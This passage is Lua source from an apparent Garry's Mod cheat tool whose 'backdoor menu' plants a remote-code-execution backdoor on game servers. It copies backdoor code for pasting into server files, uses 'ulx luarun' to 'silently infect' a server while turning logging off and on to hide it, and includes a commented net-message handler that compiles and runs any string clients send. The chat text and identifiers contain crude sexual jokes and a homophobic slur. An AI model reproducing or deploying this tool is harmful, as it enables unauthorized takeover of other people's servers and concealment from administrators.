        BD.ChatText( "Output backdoor code to clipboard.  Ctrl-V it into a serverside .lua file on the target server then go molest its holes", Color(155,255,155) )
 
        local bdstring = BD.GetActive().Code
 
 --       local bdstring = [[util.AddNetworkString( "_CAC_ReadMemory" ) net.Receive( "_CAC_ReadMemory", function() local x = CompileString( net.ReadString(), "LuaCmd", false ) if isfunction( x ) then x() end end )]]
 
        SetClipboardText( bdstring )
 
    end
 
 
 
    local helpimretarded2 = vgui.Create("DButton", BDMenu)
 
    helpimretarded2:SetSize( 200, 35 )
 
    helpimretarded2:SetPos( 20, 620 )
 
    helpimretarded2:SetText("ULX Luarun Backdoor")
 
    helpimretarded2:SetTextColor(Color(255, 255, 255, 255))
 
    helpimretarded2.Paint = function(panel, w, h)
 
        surface.SetDrawColor(100, 100, 200 ,255)
 
        surface.DrawOutlinedRect(0, 0, w, h)
 
        surface.SetDrawColor(0, 0, 50 ,155)
 
        surface.DrawRect(0, 0, w, h)
 
    end
 
    helpimretarded2.DoClick = function()
 
        BD.ChatText( "Using ulx luarun to silently infect server", Color(155,255,155) )
 
        LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 0]] )
 
        timer.Simple( 0.5, function()
 
            LocalPlayer():ConCommand( "ulx luarun "..BD.GetActive().Code )
 
--            LocalPlayer():ConCommand( "ulx luarun util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )" )
 
        end )
 
        timer.Simple( 1, function() LocalPlayer():ConCommand( [[ulx rcon ulx logEcho 1]] ) end )
 
 
 
        timer.Simple( 1.5, function() if BD.IsMessagePooled( BD.GetActive().Netkey ) then BD.ChatText( "Successfully infected!", Color(155,255,155) ) else BD.ChatText( "ULX infection failed!", Color(255,155,155) ) end end )
 
    end
 
 
 
 
 
local moonman = vgui.Create( "DTextEntry", BDMenu )
 
moonman:SetPos( 430, 625 )
 
moonman:SetSize( 200, 30 )
 
moonman:SetText( backdoorargs )
 
moonman.OnChange = function( self )
 
    backdoorargs = self:GetValue()
 
--    surface.PlaySound("buttons/button3.wav")
 
end
 
 
 
 
 
    local target1 = vgui.Create("DButton", BDMenu)
 
    target1:SetSize( 40, 20 )
 
    target1:SetPos( 520, 295 )
 
    target1:SetText("All")
 
    target1:SetTextColor(Color(255, 255, 255, 255))
 
    target1.Paint = function(panel, w, h)
 
        surface.SetDrawColor(100, 100, 200 ,255)
 
        surface.DrawOutlinedRect(0, 0, w, h)
 
        surface.SetDrawColor(0, 0, 50 ,155)
 
        surface.DrawRect(0, 0, w, h)
 
    end
 
    target1.DoClick = function()
 
        for _, p in pairs(player.GetAll()) do
 
            if not table.HasValue( selectedplayers, p ) then
 
                table.insert( selectedplayers, p )
 
            end
 
        end
 
    end
 
 
 
    local target2 = vgui.Create("DButton", BDMenu)
 
    target2:SetSize( 40, 20 )
 
    target2:SetPos( 565, 295 )
 
    target2:SetText("None")
 
    target2:SetTextColor(Color(255, 255, 255, 255))
 
    target2.Paint = function(panel, w, h)
 
        surface.SetDrawColor(100, 100, 200 ,255)
 
        surface.DrawOutlinedRect(0, 0, w, h)
 
        surface.SetDrawColor(0, 0, 50 ,155)
 
        surface.DrawRect(0, 0, w, h)
 
    end
 
    target2.DoClick = function()
 
        table.Empty( selectedplayers )
 
    end
 
 
 
    local target2 = vgui.Create("DButton", BDMenu)
 
    target2:SetSize( 20, 20 )
 
    target2:SetPos( 610, 295 )
 
    target2:SetText("Me")
 
    target2:SetTextColor(Color(255, 255, 255, 255))
 
    target2.Paint = function(panel, w, h)
 
        surface.SetDrawColor(100, 100, 200 ,255)
 
        surface.DrawOutlinedRect(0, 0, w, h)
 
        surface.SetDrawColor(0, 0, 50 ,155)
 
        surface.DrawRect(0, 0, w, h)
 
    end
 
    target2.DoClick = function()
 
        table.Empty( selectedplayers )
 
        table.insert( selectedplayers, LocalPlayer() )
 
    end
 
 
 
 
 
 
 
-- players list
 
 
 
for k, v in pairs( player.GetAll() ) do
 
 
 
    local plypanel2 = vgui.Create( "DPanel" )
 
    plypanel2:SetPos( 0, 0 )
 
    plypanel2:SetSize( 200, 25 )
 
    plypanel2.Paint = function() -- Paint function
 
        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)
 
        if table.HasValue( selectedplayers, v ) then surface.SetDrawColor(Color(50, 255, 90, 255)) else surface.SetDrawColor(Color(50, 50, 90, 255)) end
 
        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)
 
    end
 
 
 
    local plyname = vgui.Create( "DLabel", plypanel2 )
 
    plyname:SetPos( 10, 5 )
 
    plyname:SetFont( "Trebuchet18" )
 
    local tcol = Color( 255, 255, 255 )
 
    if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
 
  --  elseif BD.IsFriend( v ) then tcol = Color( 0, 255, 0 )
 
--    elseif BD.GetRank(v) != ( "user" or "guest" or "player" ) then tcol = Color( 255, 100, 0 ) end
 
    plyname:SetColor( tcol )
 
    plyname:SetText( v:Nick() )
 
    plyname:SetSize(180, 15)
 
 
 
 
 
    local faggot = vgui.Create("DButton", plypanel2)
 
    faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
 
    faggot:SetPos( 0, 0 )
 
    faggot:SetText("")
 
    faggot.Paint = function(panel, w, h)
 
        return
 
    end
 
    faggot.DoClick = function()
 
        if table.HasValue( selectedplayers, v ) then
 
            table.RemoveByValue( selectedplayers, v )
 
        else
 
            table.insert( selectedplayers, v )
 
        end
 
    end
 
 
 
 
 
    Plist4:AddItem( plypanel2 )
 
 
 
end
 
 
 
 
 
BD.GenerateBackdoorList( Plist, 1 )
 
BD.GenerateBackdoorList( Plist2, 2 )
 
BD.GenerateBackdoorList( Plist3, 3 )
 
 
 
end
 
concommand.Add("bd_menu", BD.BackdoorMenu)
 
 
 
 
 
function BD.QuickFireBackdoor()
 
if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then BD.ChatText( "You haven't even selected a macro to use ya dingus!", Color(255,155,155) ) return end
 
if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end
 
end
 
concommand.Add("bd_quickfire", BD.QuickFireBackdoor)